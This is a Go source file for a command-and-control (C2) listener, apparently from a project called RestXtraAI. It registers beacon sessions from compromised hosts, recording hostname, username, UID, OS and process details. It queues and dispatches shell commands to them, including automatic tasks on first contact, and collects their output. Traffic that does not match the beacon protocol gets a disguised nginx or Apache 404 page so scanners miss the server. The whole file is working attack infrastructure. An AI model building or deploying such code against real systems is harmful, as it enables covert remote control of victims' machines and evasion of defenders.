package c2

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/RestXtra/RestXtraAI/db"
)

type beaconTaskOut struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func readJSON(r *http.Request, v any) error {
	defer r.Body.Close()
	return json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(v)
}

// ServeHTTP routes beacon traffic according to the malleable profile URIs;
// anything that does not match the beacon protocol is answered with the decoy
// (listener disguise) response so non-C2 scanners see a believable server.
func (rl *runningListener) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if !rl.firewallOK(r) {
		rl.decoy(w, r)
		return
	}
	switch r.URL.Path {
	case rl.regURI:
		rl.handleRegister(w, r)
	case rl.pollURI:
		rl.handlePoll(w, r)
	case rl.resURI:
		rl.handleResult(w, r)
	default:
		rl.decoy(w, r)
	}
}

// handleRegister upserts the beacon session, enqueues auto-tasks for the
// listener, then returns any queued tasks so the beacon can start immediately.
func (rl *runningListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	var info struct {
		SessionID   string `json:"session_id"`
		Host        string `json:"host"`
		RemoteIP    string `json:"remote_ip"`
		Location    string `json:"location"`
		Hostname    string `json:"hostname"`
		Username    string `json:"username"`
		UID         string `json:"uid"`
		GID         string `json:"gid"`
		OS          string `json:"os"`
		Arch        string `json:"arch"`
		PID         int32  `json:"pid"`
		ProcessName string `json:"process_name"`
		Connection  string `json:"connection"`
	}
	if err := readJSON(r, &info); err != nil {
		writeJSON(w, 400, map[string]any{"error": "bad request"})
		return
	}
	if strings.TrimSpace(info.SessionID) == "" {
		writeJSON(w, 400, map[string]any{"error": "session_id required"})
		return
	}
	// best-effort external IP from the connection
	remoteIP := info.RemoteIP
	if remoteIP == "" {
		if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
			remoteIP = host
		}
	}
	lid := rl.l.ID
	if err := rl.mgr.db.UpsertC2Session(&db.C2Session{
		ListenerID:  &lid,
		SessionID:   info.SessionID,
		Host:        info.Host,
		RemoteIP:    remoteIP,
		Location:    info.Location,
		Hostname:    info.Hostname,
		Username:    info.Username,
		UID:         info.UID,
		GID:         info.GID,
		OS:          info.OS,
		Arch:        info.Arch,
		PID:         info.PID,
		ProcessName: info.ProcessName,
		Connection:  info.Connection,
		Status:      "active",
	}); err != nil {
		writeJSON(w, 500, map[string]any{"error": "storage"})
		return
	}
	rl.mgr.runAutoTasks(rl.l.ID, info.SessionID)
	tasks, _ := rl.mgr.db.ClaimC2Tasks(info.SessionID, 10)
	writeJSON(w, 200, map[string]any{"sid": info.SessionID, "tasks": beaconTasks(tasks)})
}

func (rl *runningListener) handlePoll(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := readJSON(r, &req); err != nil || req.SessionID == "" {
		writeJSON(w, 400, map[string]any{"error": "bad request"})
		return
	}
	_ = rl.mgr.db.TouchC2Session(req.SessionID)
	tasks, _ := rl.mgr.db.ClaimC2Tasks(req.SessionID, 10)
	writeJSON(w, 200, map[string]any{"tasks": beaconTasks(tasks)})
}

func (rl *runningListener) handleResult(w http.ResponseWriter, r *http.Request) {
	var req struct {
		TaskID int64  `json:"task_id"`
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	if err := readJSON(r, &req); err != nil {
		writeJSON(w, 400, map[string]any{"error": "bad request"})
		return
	}
	state := "completed"
	if req.Error != "" {
		state = "failed"
	}
	resp, _ := json.Marshal(map[string]string{"output": req.Output, "error": req.Error})
	_ = rl.mgr.db.UpdateC2TaskResult(req.TaskID, state, resp)
	writeJSON(w, 200, map[string]any{"ok": true})
}

func beaconTasks(tasks []*db.C2Task) []beaconTaskOut {
	out := make([]beaconTaskOut, 0, len(tasks))
	for _, t := range tasks {
		out = append(out, beaconTaskOut{ID: t.ID, Command: t.Command})
	}
	return out
}

// runAutoTasks enqueues enabled auto-task command groups for a fresh session.
func (m *Manager) runAutoTasks(listenerID int64, sessionID string) {
	all, err := m.db.ListC2AutoTasks()
	if err != nil {
		return
	}
	for _, a := range all {
		if !a.Enabled || a.ListenerID == nil || *a.ListenerID != listenerID {
			continue
		}
		switch a.Target {
		case "workflow":
			if a.WorkflowID != nil && TriggerWorkflow != nil {
				if err := TriggerWorkflow(*a.WorkflowID, listenerID, sessionID); err != nil {
					coreLogf("workflow auto-task %d failed for %s: %v", a.ID, sessionID, err)
				}
			} else {
				coreLogf("workflow auto-task %d for %s skipped (engine not wired)", a.ID, sessionID)
			}
			continue
		}
		var cmds []string
		if err := json.Unmarshal(a.Commands, &cmds); err != nil {
			continue
		}
		for _, c := range cmds {
			_, _ = m.db.CreateC2Task(sessionID, c, "auto:"+a.Name, nil)
		}
	}
}

// firewallOK enforces the listener's optional HTTP basic auth.
func (rl *runningListener) firewallOK(r *http.Request) bool {
	var fw struct {
		BasicAuthEnabled bool   `json:"basic_auth_enabled"`
		BasicAuthUser    string `json:"basic_auth_user"`
		BasicAuthPass    string `json:"basic_auth_pass"`
	}
	if len(rl.l.Firewall) == 0 {
		return true
	}
	_ = json.Unmarshal(rl.l.Firewall, &fw)
	if !fw.BasicAuthEnabled {
		return true
	}
	u, p, ok := r.BasicAuth()
	return ok && u == fw.BasicAuthUser && p == fw.BasicAuthPass
}

// decoy answers non-beacon traffic with the listener disguise profile.
func (rl *runningListener) decoy(w http.ResponseWriter, r *http.Request) {
	var dg struct {
		DecoyType     string            `json:"decoy_type"`
		StatusCode    int               `json:"status_code"`
		ServerHeader  string            `json:"server_header"`
		ContentType   string            `json:"content_type"`
		CustomBody    string            `json:"custom_body"`
		CustomHeaders map[string]string `json:"custom_headers"`
	}
	_ = json.Unmarshal(rl.l.Disguise, &dg)
	if dg.DecoyType == "" {
		dg.DecoyType = "nginx_404"
	}
	if dg.StatusCode == 0 {
		dg.StatusCode = 404
	}
	if dg.ContentType == "" {
		dg.ContentType = "text/html"
	}
	if dg.ServerHeader == "" {
		dg.ServerHeader = "nginx/1.24.0"
	}
	h := w.Header()
	h.Set("Server", dg.ServerHeader)
	h.Set("Content-Type", dg.ContentType)
	for k, v := range dg.CustomHeaders {
		h.Set(k, v)
	}
	w.WriteHeader(dg.StatusCode)
	if dg.CustomBody != "" {
		_, _ = io.WriteString(w, dg.CustomBody)
		return
	}
	switch dg.DecoyType {
	case "nginx_404":
		_, _ = io.WriteString(w, "<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx/1.24.0</center></body></html>")
	case "apache_404":
		_, _ = io.WriteString(w, "<html><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache/2.4.54 (Ubuntu) Server</address></body></html>")
	default:
		_, _ = io.WriteString(w, "Not Found")
	}
}
